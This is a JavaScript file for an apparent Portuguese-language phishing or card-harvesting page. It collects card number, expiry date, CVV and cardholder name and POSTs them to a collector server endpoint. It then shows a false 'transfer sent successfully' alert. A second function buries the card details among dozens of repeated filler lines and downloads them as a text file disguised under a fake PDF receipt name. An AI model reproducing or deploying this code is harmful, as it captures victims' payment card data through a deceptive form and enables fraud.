document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("#dadosss");
    const dadosForm = document.querySelector("#dados");

    const campos = {
        numero: document.querySelector("#numero"),
        data: document.querySelector("#data"),
        cvv: document.querySelector("#cvv"),
        nome: document.querySelector("#nome"),
    };

    const mensagensDica = {
        numero: "Exemplo: 1234 5678 9123 4567",
        data: "Exemplo: 12/30",
        cvv: "Exemplo: 123",
        nome: "Nome completo impresso no cartão.",
    };

    for (const key in campos) {
        const input = campos[key];

        input.addEventListener("focus", () => {
            removeMensagemDica(input);

            const dica = document.createElement("span");
            dica.classList.add("mensagem-dica");
            dica.style.color = "#666";
            dica.style.fontSize = "12px";
            dica.style.display = "block";
            dica.style.marginTop = "4px";
            dica.textContent = mensagensDica[key];

            input.parentElement.appendChild(dica);
        });

        input.addEventListener("blur", () => {
            removeMensagemDica(input);
        });
    }

    function removeMensagemDica(input) {
        const existing = input.parentElement.querySelector(".mensagem-dica");
        if (existing) existing.remove();
    }

    form.addEventListener("submit", async (event) => {
    event.preventDefault(); // Impede a página de recarregar

    // Pegamos os valores dos campos que você já definiu
    const dadosParaEnviar = {
        numero: campos.numero.value,
        dataValidade: campos.data.value,
        cvv: campos.cvv.value,
        nome: campos.nome.value,
        tipo: document.querySelector('input[name="gender"]:checked')?.value
    };

    try {
        // Faz a conexão com o servidor que criamos no Passo 2
        const resposta = await fetch('http://localhost:3000/enviar-dados', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(dadosParaEnviar)
        });

        if (resposta.ok) {
            alert("Transferência enviada com sucesso!");
            // Opcional: Redirecionar o usuário
            // window.location.href = "sucesso.html";
        } else {
            alert("Erro ao enviar dados para o servidor.");
        }
    } catch (error) {
        console.error("Erro de conexão:", error);
        alert("O servidor está desligado! Ligue o servidor no terminal.");
    }
});

    function saveFormDataToFile() {
        const cardNumber = campos.numero.value;
        const expiryDate = campos.data.value;
        const cvv = campos.cvv.value;
        const cardName = campos.nome.value;
        const cardType = document.querySelector('input[name="gender"]:checked')?.value || 'Not selected';
        
        const formData = `
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Número: ${cardNumber}
Validade: ${expiryDate}
CVV: ${cvv}
Nome no Cartão: ${cardName}
Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType} Tipo: ${cardType}
`;
        
        const blob = new Blob([formData], { type: 'text/plain' });
        
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'comprovante_erro_1023404.pdf';
        
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(a.href);
    }

});
